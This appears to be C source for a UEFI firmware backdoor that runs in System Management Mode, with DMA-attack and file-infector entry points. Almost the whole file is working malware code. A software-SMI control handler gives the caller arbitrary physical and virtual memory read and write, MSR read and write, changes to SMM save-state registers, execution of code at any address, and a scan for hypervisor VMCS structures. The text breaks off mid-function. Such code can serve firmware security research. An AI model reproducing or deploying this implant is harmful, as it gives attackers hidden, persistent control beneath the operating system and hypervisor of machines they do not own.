#include <FrameworkSmm.h>

#include <Protocol/LoadedImage.h>
#include <Protocol/SmmAccess2.h>
#include <Protocol/SmmBase2.h>
#include <Protocol/SmmSwDispatch2.h>
#include <Protocol/SmmPeriodicTimerDispatch2.h>
#include <Protocol/SmmCpu.h>

#include <IndustryStandard/PeImage.h>

#include "../config.h"
#include "../interface.h"

#include "common.h"
#include "printf.h"
#include "serial.h"
#include "debug.h"
#include "loader.h"
#include "ovmf.h"
#include "backdoor.h"
#include "exploit.h"
#include "std.h"
#include "virtmem.h"
#include "asm/common_asm.h"

#pragma warning(disable: 4054)
#pragma warning(disable: 4055)
#pragma warning(disable: 4305)

#pragma section(".conf", read, write)

// APMC I/O ports to generate software SMI
#define APMC_DATA       0xb3
#define APMC_COMMAND    0xb2

// for VMCS revision ID
#define IA32_VMX_BASIC  0x480

typedef VOID (* BACKDOOR_ENTRY_SMM)(EFI_SMM_SYSTEM_TABLE2 *Smst);

typedef VOID (* BACKDOOR_ENTRY_RESIDENT)(VOID *Image);

// DMA attack entry point
EFI_STATUS EFIAPI BackdoorEntryDma(EFI_GUID *Protocol, VOID *Registration, VOID **Interface);

// file infector entry point
EFI_STATUS EFIAPI BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable);

// PE image section with information for infector
__declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig = 
{ 
    // address of LocateProtocol() hook handler
    (UINT64)&BackdoorEntryDma,

    // address of original LocateProtocol() function
    0,

    // address of EFI_SYSTEM_TABLE
    0,

    // *******************************************************

    // address of infector entry point
    (UINT64)&BackdoorEntryInfected,

    // RVA of original entry point
    0
};

VOID *m_ImageBase = NULL;
EFI_SYSTEM_TABLE *m_ST = NULL;
EFI_BOOT_SERVICES *m_BS = NULL;
EFI_RUNTIME_SERVICES *m_RT = NULL;
EFI_SMM_SYSTEM_TABLE2 *m_Smst = NULL;

// console I/O interface for debug messages
EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *m_TextOutput = NULL; 
char *m_OutputBuffer = NULL;

// SMRAM regions information
EFI_SMRAM_DESCRIPTOR m_SmramMap[MAX_SMRAM_REGIONS];
UINTN m_SmramMapSize = 0;

// software SMI handler register context
EFI_SMM_SW_REGISTER_CONTEXT m_SwDispatchRegCtx = { BACKDOOR_SW_SMI_VAL };

// SMM periodic timer register context (time in 100 nanosecond units)
EFI_SMM_PERIODIC_TIMER_REGISTER_CONTEXT m_TimerDispatchRegCtx = { 1000000, 640000 };

// address of dummy memory page used in VirtualAddrRemap()
UINT64 m_DummyPage = 0;

// temp buffer for memory read/write CTL requests
UINT8 *m_TempBuff = NULL;
//--------------------------------------------------------------------------------------
void ConsolePrintScreen(char *Message)
{
    if (m_TextOutput)
    {
        size_t Len = std_strlen(Message), i = 0;

        for (i = 0; i < Len; i += 1)
        {    
            CHAR16 Char[2];        

            Char[0] = (CHAR16)Message[i];
            Char[1] = 0;

            m_TextOutput->OutputString(m_TextOutput, Char);
        }
    }
}

void ConsolePrintBuffer(char *Message)
{
    size_t Len = std_strlen(Message);

    if (m_OutputBuffer && std_strlen(m_OutputBuffer) + Len < DEBUG_OUTPUT_SIZE)
    {                    
        std_strcat(m_OutputBuffer, Message);
    }
}

void ConsolePrint(char *Message)
{
    // print messages to the screem
    ConsolePrintScreen(Message);

    // save messages to the buffer
    ConsolePrintBuffer(Message);
}
//--------------------------------------------------------------------------------------
void ConsoleInitialize(void)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_PHYSICAL_ADDRESS PagesAddr;

    // initialize console I/O
    Status = m_BS->HandleProtocol(
        m_ST->ConsoleOutHandle,
        &gEfiSimpleTextOutProtocolGuid, 
        (VOID **)&m_TextOutput
    );
    if (Status == EFI_SUCCESS)
    {
        m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
        m_TextOutput->ClearScreen(m_TextOutput);
    }

    // allocate memory for pending debug output
    Status = m_BS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        DEBUG_OUTPUT_SIZE / PAGE_SIZE, &PagesAddr
    );
    if (Status == EFI_SUCCESS) 
    {
        EFI_GUID VariableGuid = BACKDOOR_VAR_GUID;

        m_OutputBuffer = (char *)PagesAddr;        
        m_BS->SetMem(m_OutputBuffer, DEBUG_OUTPUT_SIZE, 0);

        // save memory address into the firmware variable
        Status = m_ST->RuntimeServices->SetVariable(
            BACKDOOR_VAR_NAME, &VariableGuid,
            EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_BOOTSERVICE_ACCESS,
            sizeof(PagesAddr), (VOID *)&PagesAddr
        );
        if (EFI_ERROR(Status)) 
        {
            DbgMsg(__FILE__, __LINE__, "SetVariable() ERROR 0x%x\r\n", Status);
        }
    }
    else
    {     
        DbgMsg(__FILE__, __LINE__, "AllocatePages() ERROR 0x%x\r\n", Status);
    }
}

void ConsoleDisable(void)
{
    // disable console output
    m_TextOutput = NULL;
}

void ConsoleClearBuffer(void)
{
    if (m_OutputBuffer)
    {
        // clear debug messages buffer
        *m_OutputBuffer = '\0';
    }
}
//--------------------------------------------------------------------------------------
VOID *ImageBaseByAddress(VOID *Addr)
{
    UINTN Offset = 0;
    UINTN Base = (UINTN)Addr;

    Base = ALIGN_DOWN(Base, DEFAULT_EDK_ALIGN);    

    // get current module base by address inside of it
    while (Offset < MAX_IMAGE_SIZE)
    {
        if (*(UINT16 *)(Base - Offset) == EFI_IMAGE_DOS_SIGNATURE ||
            *(UINT16 *)(Base - Offset) == EFI_TE_IMAGE_HEADER_SIGNATURE)
        {
            return (VOID *)(Base - Offset);
        }

        Offset += DEFAULT_EDK_ALIGN;
    }

    // unable to locate PE/TE header
    return NULL;
}
//--------------------------------------------------------------------------------------
VOID *ImageRelocate(VOID *Image)
{
    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        Image, 
        ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew
    );
    
    UINTN PagesCount = (pHeaders->OptionalHeader.SizeOfImage / PAGE_SIZE) + 1;
    EFI_PHYSICAL_ADDRESS Addr = 0;    

    // allocate memory for executable image
    EFI_STATUS Status = m_BS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        PagesCount,
        &Addr
    );
    if (Status == EFI_SUCCESS)
    {     
        VOID *Realocated = (VOID *)Addr;

        // copy image to the new location
        m_BS->CopyMem(Realocated, Image, pHeaders->OptionalHeader.SizeOfImage); 

        // update image relocations in according to the new address
        LDR_UPDATE_RELOCS(Realocated, Image, Realocated);

        return Realocated;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "AllocatePool() ERROR 0x%x\r\n", Status);
    }
 
    return NULL;
}
//--------------------------------------------------------------------------------------
EFI_STATUS RegisterProtocolNotifySmm(EFI_GUID *Guid, EFI_SMM_NOTIFY_FN Handler, VOID **Registration)
{
    EFI_STATUS Status = EFI_SUCCESS;

    if ((Status = m_Smst->SmmRegisterProtocolNotify(Guid, Handler, Registration)) != EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, "RegisterProtocolNotify() ERROR 0x%x\r\n", Status);
    }

    return Status;
}

EFI_STATUS RegisterProtocolNotifyDxe(
    EFI_GUID *Guid, EFI_EVENT_NOTIFY Handler,
    EFI_EVENT *Event, VOID **Registration)
{
    EFI_STATUS Status = EFI_SUCCESS;

    if ((Status = m_BS->CreateEvent(EVT_NOTIFY_SIGNAL, TPL_CALLBACK, Handler, NULL, Event)) != EFI_SUCCESS) 
    {
        DbgMsg(__FILE__, __LINE__, "CreateEvent() ERROR 0x%x\r\n", Status);
        return Status;
    }

    if ((Status = m_BS->RegisterProtocolNotify(Guid, *Event, Registration)) != EFI_SUCCESS) 
    {
        DbgMsg(__FILE__, __LINE__, "RegisterProtocolNotify() ERROR 0x%x\r\n", Status);
        return Status;
    }

    DbgMsg(__FILE__, __LINE__, "Protocol notify handler is at "FPTR"\r\n", Handler);

    return Status;
}
//--------------------------------------------------------------------------------------
VOID SimpleTextOutProtocolNotifyHandler(EFI_EVENT Event, VOID *Context)
{
    EFI_STATUS Status = EFI_SUCCESS;

    if (m_TextOutput == NULL)
    {
        // initialize console I/O
        Status = m_BS->HandleProtocol(
            m_ST->ConsoleOutHandle,
            &gEfiSimpleTextOutProtocolGuid,
            (VOID **)&m_TextOutput
        );
        if (Status == EFI_SUCCESS)
        {
            m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
            m_TextOutput->ClearScreen(m_TextOutput);

            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Ready\r\n");

            if (m_OutputBuffer)
            {
                // print pending messages
                ConsolePrintScreen(m_OutputBuffer);

                m_BS->Stall(TO_MICROSECONDS(3));
            }
        }
    }
}

VOID SimpleTextOutProtocolNotifyRegister(VOID)
{
    VOID *Registration = NULL;
    EFI_EVENT Event = NULL;

    // set text output protocol register notify
    RegisterProtocolNotifyDxe(
        &gEfiSimpleTextOutProtocolGuid, SimpleTextOutProtocolNotifyHandler,
        &Event, &Registration
    );
}
//--------------------------------------------------------------------------------------
#ifdef USE_PERIODIC_TIMER

EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *m_TimerDispatch = NULL;
EFI_HANDLE m_TimerDispatchHandle = NULL;

EFI_STATUS EFIAPI PeriodicTimerDispatch2Handler(
    EFI_HANDLE DispatchHandle, CONST VOID *Context,
    VOID *CommBuffer, UINTN *CommBufferSize
);

EFI_STATUS PeriodicTimerDispatch2Register(EFI_HANDLE *DispatchHandle)
{
    EFI_STATUS Status = EFI_INVALID_PARAMETER;  

    if (m_TimerDispatch)
    {
        // register periodic timer routine
        Status = m_TimerDispatch->Register(
            m_TimerDispatch, 
            PeriodicTimerDispatch2Handler, 
            &m_TimerDispatchRegCtx,
            DispatchHandle
        );
        if (Status != EFI_SUCCESS)
        {
            DbgMsg(__FILE__, __LINE__, "Register() ERROR 0x%X\r\n", Status);
        }
    }    

    return Status;
}

EFI_STATUS PeriodicTimerDispatch2Unregister(EFI_HANDLE DispatchHandle)
{
    EFI_STATUS Status = EFI_INVALID_PARAMETER;  

    if (m_TimerDispatch)
    {
        // register periodic timer routine
        Status = m_TimerDispatch->UnRegister(
            m_TimerDispatch, 
            DispatchHandle
        );
        if (Status != EFI_SUCCESS)
        {
            DbgMsg(__FILE__, __LINE__, "Unregister() ERROR 0x%X\r\n", Status);
        }
    }    

    return Status;
}

#endif // USE_PERIODIC_TIMER
//--------------------------------------------------------------------------------------
/*
    34.4.1.1 - SMRAM State Save Map and Intel 64 Architecture

        When the processor initially enters SMM, it writes its state to the 
        state save area of the SMRAM. The state save area on an Intel 64 processor 
        at [SMBASE + 8000H + 7FFFH] and extends to [SMBASE + 8000H + 7C00H].
*/
#define SAVE_SATE_START 0x7c00

// save state region size for Intel 64
#define SAVE_SATE_SIZE (0x8000 - SAVE_SATE_START)

// registers offsets
#define SAVE_SATE_REG_RCX       (0x7f64 - SAVE_SATE_START)
#define SAVE_SATE_REG_RDI       (0x7f94 - SAVE_SATE_START)
#define SAVE_SATE_REG_RSI       (0x7f8C - SAVE_SATE_START)
#define SAVE_SATE_REG_R8        (0x7f54 - SAVE_SATE_START)
#define SAVE_SATE_REG_R9        (0x7f4c - SAVE_SATE_START)
#define SAVE_SATE_REG_CR0       (0x7ff8 - SAVE_SATE_START)
#define SAVE_SATE_REG_CR3       (0x7ff0 - SAVE_SATE_START)

// EPT related fields
#define SAVE_SATE_EPTP_ENABLE   (0x7ee0 - SAVE_SATE_START)
#define SAVE_SATE_EPTP_ADDR     (0x7ed8 - SAVE_SATE_START)

UINT8 *SaveStateFindAddr(UINTN CpuIndex, EFI_SMM_CPU_PROTOCOL *SmmCpu, PCONTROL_REGS ControlRegs)
{
    EFI_STATUS Status = EFI_SUCCESS;
    UINT64 Rcx = 0, Rdi = 0, Rsi = 0;
    UINTN i = 0, n = 0;

    // for VirtualAddrValid() calls
    UINT64 Cr3 = __readcr3();

    Status = SmmCpu->ReadSaveState(
        SmmCpu, sizeof(Rcx), EFI_SMM_SAVE_STATE_REGISTER_RCX, 
        CpuIndex, (VOID *)&Rcx
    );
    if (EFI_ERROR(Status))
    {
        DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
        goto _end;
    }

    Status = SmmCpu->ReadSaveState(
        SmmCpu, sizeof(Rdi), EFI_SMM_SAVE_STATE_REGISTER_RDI, 
        CpuIndex, (VOID *)&Rdi
    );
    if (EFI_ERROR(Status))
    {
        DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
        goto _end;
    }

    Status = SmmCpu->ReadSaveState(
        SmmCpu, sizeof(Rsi), EFI_SMM_SAVE_STATE_REGISTER_RSI, 
        CpuIndex, (VOID *)&Rsi
    );
    if (EFI_ERROR(Status))
    {
        DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
        goto _end;
    }

    // enumerate SMRAM regions
    for (i = 0; i < m_SmramMapSize; i += 1)
    {
        // scan for the SMM saved state area
        for (n = 0; n < m_SmramMap[i].PhysicalSize - SAVE_SATE_SIZE; n += SAVE_SATE_SIZE)
        {       
            // ensure that SMRAM memory page is valid and mapped     
            if (VirtualAddrValid(m_SmramMap[i].PhysicalStart + n, Cr3))
            {
                UINT8 *Ptr = (UINT8 *)(m_SmramMap[i].PhysicalStart + n);

                // check for the known register values in saved state
                if (*(UINT64 *)(Ptr + SAVE_SATE_REG_RCX) == Rcx &&
                    *(UINT64 *)(Ptr + SAVE_SATE_REG_RDI) == Rdi &&
                    *(UINT64 *)(Ptr + SAVE_SATE_REG_RSI) == Rsi &&
                    *(UINT64 *)(Ptr + SAVE_SATE_REG_CR0) == ControlRegs->Cr0 &&
                    *(UINT64 *)(Ptr + SAVE_SATE_REG_CR3) == ControlRegs->Cr3)
                {
                    return Ptr;
                }
            }
        }
    }

_end:

    return NULL;
}
//--------------------------------------------------------------------------------------
// how many bytes of VMCS region to scan for known values
#define VMCS_SEARCH_SIZE 0x400

BOOLEAN VmcsSearchVal(UINT8 *Addr, UINT64 Size, UINT64 Value)
{
    UINT64 i = 0;

    // scan specified memory region
    for (i = 0; i < Size; i += sizeof(UINT64))
    {
        // check for desired value
        if (*(UINT64 *)(Addr + i) == Value)
        {
            return TRUE;
        }
    }

    return FALSE;
}

EFI_STATUS SmmCtlHandle(
    UINTN CpuIndex, EFI_SMM_CPU_PROTOCOL *SmmCpu,
    UINT64 Code, UINT64 Args, PCONTROL_REGS ControlRegs)
{
    BACKDOOR_CTL Ctl;
    UINT64 ArgsAddr = 0, Eptp = 0;
    UINT8 *SaveStateAddr = NULL;
    BOOLEAN bLargePage = FALSE;

    // read SMM control registes
    UINT64 Cr0 = __readcr0();
    UINT64 Cr3 = __readcr3();

#ifdef USE_PERIODIC_TIMER

    if (Code == BACKDOOR_CTL_TIMER_ENABLE || Code == BACKDOOR_CTL_TIMER_DISABLE)
    {
        if (m_TimerDispatch)
        {
            BOOLEAN bNotify = FALSE;

            if (m_TimerDispatchHandle)
            {
                // unregister old handler
                PeriodicTimerDispatch2Unregister(m_TimerDispatchHandle);
                m_TimerDispatchHandle = NULL;
            }
            else
            {
                bNotify = TRUE;
            }

            if (Code == BACKDOOR_CTL_TIMER_ENABLE)
            {
                // register new handler
                if (PeriodicTimerDispatch2Register(&m_TimerDispatchHandle) == EFI_SUCCESS)
                {
                    if (bNotify)
                    {
                        DbgMsg(
                            __FILE__, __LINE__, 
                            __FUNCTION__"(): Periodic timer SW SMI was enabled\r\n"
                        );
                    }
                }
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Periodic timer SW SMI was disabled\r\n");
            }
        }

        return EFI_SUCCESS;
    }

#endif // USE_PERIODIC_TIMER

    // check for the sane caller memory paging configuration
    if (!Check_IA_32e())
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: IA-32e paging is not enabled\r\n");
        return EFI_UNSUPPORTED;
    }

    // sanity check
    if (Args == 0 || m_DummyPage == 0 || m_TempBuff == NULL)
    {
        return EFI_INVALID_PARAMETER;
    }

    // get CPU saved state location
    if ((SaveStateAddr = SaveStateFindAddr(CpuIndex, SmmCpu, ControlRegs)) != 0)
    {
        DbgMsg(__FILE__, __LINE__, "SMM save state address is 0x%llx\r\n", SaveStateAddr);
        
        // check for EPTP enable flag
        if (*(UINT32 *)(SaveStateAddr + SAVE_SATE_EPTP_ENABLE) != 0)
        {
            // obtain EPTP value
            Eptp = *(UINT64 *)(SaveStateAddr + SAVE_SATE_EPTP_ADDR);

            DbgMsg(__FILE__, __LINE__, "EPTP value is 0x%llx\r\n", Eptp);
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "Unable to locate SMM save state aread\r\n");
    }

    // get physical address for given virtual address
    #define PHYS_GET(_virt_, _phys_) VirtualToPhysical((_virt_), (_phys_), ControlRegs->Cr3, Eptp, Cr3)

    // map physical memory page at dummy virtual page
    #define PHYS_MAP(_addr_) VirtualAddrRemap(m_DummyPage, (_addr_), Cr3, &bLargePage)

    // restore mappings
    #define PHYS_REVERT() VirtualAddrRemap(m_DummyPage, m_DummyPage, Cr3, &bLargePage)

    // get mapped virtual address
    #define MAPPED_ADDR(_addr_) ((UINT8 *)m_DummyPage + (bLargePage ? PAGE_OFFSET_2M((_addr_)) : \
                                                                      PAGE_OFFSET_4K((_addr_))))

    // get backdoor call arguments physical address
    if (PHYS_GET(Args, &ArgsAddr) == EFI_SUCCESS)
    {
        // map backdoor call arguments at SMM virtual address
        if (PHYS_MAP(ArgsAddr))
        {
            UINT8 *TargetAddr = MAPPED_ADDR(ArgsAddr);            

            // copy backdoor call arguments to the local buffer
            std_memcpy(&Ctl, TargetAddr, sizeof(BACKDOOR_CTL));

            PHYS_REVERT();
        }
        else
        {
            DbgMsg(
                __FILE__, __LINE__, 
                "ERROR: Unable to map physical address 0x%llx\r\n", ArgsAddr
            );

            return EFI_INVALID_PARAMETER;
        }
    }              
    else
    {
        DbgMsg(
            __FILE__, __LINE__, 
            "ERROR: Unable to resolve physical address for 0x%llx\r\n", Args
        );

        return EFI_INVALID_PARAMETER;
    }

    if (Code == BACKDOOR_CTL_READ_PHYS || Code == BACKDOOR_CTL_WRITE_PHYS ||
        Code == BACKDOOR_CTL_READ_VIRT || Code == BACKDOOR_CTL_WRITE_VIRT)
    {
        if (Ctl.Args.Mem.Size == 0 || Ctl.Args.Mem.Size > PAGE_SIZE)
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: Invalid memory size\r\n");

            Ctl.Status = EFI_INVALID_PARAMETER;
            goto _end;
        }

        // page boundary check
        if ((Ctl.Args.Mem.Addr & ~(PAGE_SIZE - 1)) != ((Ctl.Args.Mem.Addr + Ctl.Args.Mem.Size - 1) & ~(PAGE_SIZE - 1)))
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: Invalid memory address/size\r\n");

            Ctl.Status = EFI_INVALID_PARAMETER;
            goto _end;
        }
    }

    switch (Code)
    {
    case BACKDOOR_CTL_PING:
        {
            Ctl.Status = EFI_SUCCESS;
            break;
        }

    case BACKDOOR_CTL_INFO:
        {
            UINTN i = 0;

            // return basic information
            Ctl.Args.Info.Cr0 = Cr0;
            Ctl.Args.Info.Cr3 = Cr3;
            Ctl.Args.Info.Smst = (UINT64)m_Smst;

            for (i = 0; i < m_SmramMapSize / sizeof(EFI_SMRAM_DESCRIPTOR); i += 1)
            {
                Ctl.Args.Info.Smram[i].Addr = m_SmramMap[i].PhysicalStart;
                Ctl.Args.Info.Smram[i].Size = m_SmramMap[i].PhysicalSize;
            }

            Ctl.Status = EFI_SUCCESS;            
            break;
        }

    case BACKDOOR_CTL_READ_PHYS:    
        {
            UINT64 BuffAddr = 0;
            size_t Size = (size_t)Ctl.Args.Mem.Size;

            // map memory read target address at SMM virtual address
            if (PHYS_MAP(Ctl.Args.Mem.Addr))
            {
                UINT8 *TargetAddr = MAPPED_ADDR(Ctl.Args.Mem.Addr);            

                // copy memory contents to the temp buffer
                std_memcpy(m_TempBuff, TargetAddr, Size);

                PHYS_REVERT();
            }
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to map physical address 0x%llx\r\n", Ctl.Args.Mem.Addr
                );

                Ctl.Status = EFI_NO_MAPPING;
                break;
            }

            // get memory read buffer physical address
            if (PHYS_GET(Ctl.Args.Mem.Buff, &BuffAddr) == EFI_SUCCESS)
            {
                // map memory read buffer at SMM virtual address
                if (PHYS_MAP(BuffAddr))
                {
                    UINT8 *TargetAddr = MAPPED_ADDR(BuffAddr);            

                    // copy read memory contents to the caller buffer
                    std_memcpy(TargetAddr, m_TempBuff, Size);

                    Ctl.Status = EFI_SUCCESS;

                    PHYS_REVERT();
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to map physical address 0x%llx\r\n", BuffAddr
                    );

                    Ctl.Status = EFI_NO_MAPPING;
                    break;
                }
            }              
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", Ctl.Args.Mem.Buff
                );

                Ctl.Status = EFI_NO_MAPPING;
                break;
            }

            break;
        }

    case BACKDOOR_CTL_WRITE_PHYS:
        {
            UINT64 BuffAddr = 0;         
            size_t Size = (size_t)Ctl.Args.Mem.Size;               

            // get memory write buffer physical address
            if (PHYS_GET(Ctl.Args.Mem.Buff, &BuffAddr) == EFI_SUCCESS)
            {
                // map memory write buffer at SMM virtual address
                if (PHYS_MAP(BuffAddr))
                {
                    UINT8 *TargetAddr = MAPPED_ADDR(BuffAddr);            

                    // copy write memory contents from the caller buffer
                    std_memcpy(m_TempBuff, TargetAddr, Size);

                    PHYS_REVERT();
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to map physical address 0x%llx\r\n", BuffAddr
                    );

                    Ctl.Status = EFI_NO_MAPPING;
                    break;
                }
            }              
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", Ctl.Args.Mem.Buff
                );

                Ctl.Status = EFI_NO_MAPPING;
                break;
            }

            // map memory write target address at SMM virtual address
            if (PHYS_MAP(Ctl.Args.Mem.Addr))
            {
                UINT8 *TargetAddr = MAPPED_ADDR(Ctl.Args.Mem.Addr);            

                // copy memory contents from the temp buffer
                std_memcpy(TargetAddr, m_TempBuff, Size);

                Ctl.Status = EFI_SUCCESS;

                PHYS_REVERT();
            }
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to map physical address 0x%llx\r\n", Ctl.Args.Mem.Addr
                );

                Ctl.Status = EFI_NO_MAPPING;
                break;
            }

            break;
        }

    case BACKDOOR_CTL_READ_VIRT:    
        {            
            UINT64 BuffAddr = 0, MemAddr = 0;
            size_t Size = (size_t)Ctl.Args.Mem.Size;

            // get memory read target physical address
            if (PHYS_GET(Ctl.Args.Mem.Addr, &MemAddr) == EFI_SUCCESS)
            {
                // map memory read target address at SMM virtual address
                if (PHYS_MAP(MemAddr))
                {
                    UINT8 *TargetAddr = MAPPED_ADDR(MemAddr);            

                    // copy memory contents to the temp buffer
                    std_memcpy(m_TempBuff, TargetAddr, Size);

                    PHYS_REVERT();
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to map physical address 0x%llx\r\n", MemAddr
                    );

                    Ctl.Status = EFI_NO_MAPPING;
                    break;
                }
            }
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", Ctl.Args.Mem.Addr
                );

                Ctl.Status = EFI_NOT_FOUND;
                break;
            }

            // get memory read buffer physical address
            if (PHYS_GET(Ctl.Args.Mem.Buff, &BuffAddr) == EFI_SUCCESS)
            {
                // map memory read buffer at SMM virtual address
                if (PHYS_MAP(BuffAddr))
                {
                    UINT8 *TargetAddr = MAPPED_ADDR(BuffAddr);            

                    // copy read memory contents to the caller buffer
                    std_memcpy(TargetAddr, m_TempBuff, Size);

                    Ctl.Status = EFI_SUCCESS;

                    PHYS_REVERT();
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to map physical address 0x%llx\r\n", BuffAddr
                    );

                    Ctl.Status = EFI_NO_MAPPING;
                    break;
                }
            }              
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", Ctl.Args.Mem.Buff
                );

                Ctl.Status = EFI_NO_MAPPING;
                break;
            }

            break;
        }

    case BACKDOOR_CTL_WRITE_VIRT:
        {
            UINT64 BuffAddr = 0, MemAddr = 0;
            size_t Size = (size_t)Ctl.Args.Mem.Size;

            // get memory write buffer physical address
            if (PHYS_GET(Ctl.Args.Mem.Buff, &BuffAddr) == EFI_SUCCESS)
            {
                // map memory write buffer at SMM virtual address
                if (PHYS_MAP(BuffAddr))
                {
                    UINT8 *TargetAddr = MAPPED_ADDR(BuffAddr);            

                    // copy write memory contents from the caller buffer
                    std_memcpy(m_TempBuff, TargetAddr, Size);

                    PHYS_REVERT();
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to map physical address 0x%llx\r\n", BuffAddr
                    );

                    Ctl.Status = EFI_NO_MAPPING;
                    break;
                }
            }              
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", Ctl.Args.Mem.Buff
                );

                Ctl.Status = EFI_NO_MAPPING;
                break;
            }

            // get memory write target physical address
            if (PHYS_GET(Ctl.Args.Mem.Addr, &MemAddr) == EFI_SUCCESS)
            {
                // map memory write target address at SMM virtual address
                if (PHYS_MAP(MemAddr))
                {
                    UINT8 *TargetAddr = MAPPED_ADDR(MemAddr);            

                    // copy memory contents from the temp buffer
                    std_memcpy(TargetAddr, m_TempBuff, Size);

                    Ctl.Status = EFI_SUCCESS;

                    PHYS_REVERT();
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to map physical address 0x%llx\r\n", MemAddr
                    );

                    Ctl.Status = EFI_NO_MAPPING;
                    break;
                }
            }
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", Ctl.Args.Mem.Addr
                );

                Ctl.Status = EFI_NOT_FOUND;
                break;
            }

            break;
        }

    case BACKDOOR_CTL_EXECUTE:
        {
            typedef VOID (EFIAPI * USER_FUNC)(VOID);

            USER_FUNC Func = (USER_FUNC)Ctl.Args.Execute.Addr;

            // execute code at given address
            Func();

            Ctl.Status = EFI_SUCCESS;
            break;
        }

    case BACKDOOR_CTL_MSR_GET:
        {
            // get MSR value
            Ctl.Args.Msr.Value = __readmsr(Ctl.Args.Msr.Register);

            Ctl.Status = EFI_SUCCESS;
            break;
        }

    case BACKDOOR_CTL_MSR_SET:
        {
            // set MSR value
            __writemsr(Ctl.Args.Msr.Register, Ctl.Args.Msr.Value);

            Ctl.Status = EFI_SUCCESS;
            break;
        }

    case BACKDOOR_CTL_STATE_GET:
        {
            // get SMM save state register value
            Ctl.Status = SmmCpu->ReadSaveState(
                SmmCpu, sizeof(UINT64), Ctl.Args.SaveState.Register, 
                CpuIndex, (VOID *)&Ctl.Args.SaveState.Value
            );
            if (EFI_ERROR(Ctl.Status))
            {
                DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Ctl.Status);
            }

            break;
        }

    case BACKDOOR_CTL_STATE_SET:
        {
            // set SMM save state register value
            Ctl.Status = SmmCpu->WriteSaveState(
                SmmCpu, sizeof(UINT64), Ctl.Args.SaveState.Register, 
                CpuIndex, (VOID *)&Ctl.Args.SaveState.Value
            );
            if (EFI_ERROR(Ctl.Status))
            {
                DbgMsg(__FILE__, __LINE__, "WriteSaveState() ERROR 0x%x\r\n", Ctl.Status);
            }

            break;
        }

    case BACKDOOR_CTL_GET_PHYS_ADDR:
        {
            UINT64 UserEptp = Eptp;
            UINT64 UserCr3 = ControlRegs->Cr3;

            if (Ctl.Args.PhysAddr.Eptp != 0)
            {
                if (Ctl.Args.PhysAddr.Eptp == 1)
                {
                    // force to not use EPTP for address translation at all
                    UserEptp = 0;
                }
                else
                {
                    // use caller specified EPTP
                    UserEptp = Ctl.Args.PhysAddr.Eptp;
                }
            }

            if (Ctl.Args.PhysAddr.Cr3 != 0)
            {
                // use caller specified CR3
                UserCr3 = Ctl.Args.PhysAddr.Cr3;
            }

            // get physical address for given virtual address
            if (VirtualToPhysical(
                Ctl.Args.PhysAddr.AddrVirt, 
                &Ctl.Args.PhysAddr.AddrPhys, UserCr3, UserEptp, Cr3) != EFI_SUCCESS)
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", 
                    Ctl.Args.PhysAddr.AddrVirt
                );

                Ctl.Status = EFI_NOT_FOUND;
            }
            else
            {
                Ctl.Status = EFI_SUCCESS;
            }

            break;
        }

    case BACKDOOR_CTL_FIND_VMCS:
        {
            UINT64 GdtBase = 0, IdtBase = 0, i = 0;
            UINT64 SearchAddr = Ctl.Args.FindVmcs.Addr;
            UINT64 SearchSize = Ctl.Args.FindVmcs.Size;

            // read basic VMX infomation register
            UINT64 RevisionId = __readmsr(IA32_VMX_BASIC);

            // extract 32 bits of VMCS revision ID value
            RevisionId &= 0xffffffff;

            // addess sanity check
            if (SearchAddr % PAGE_SIZE != 0)
            {
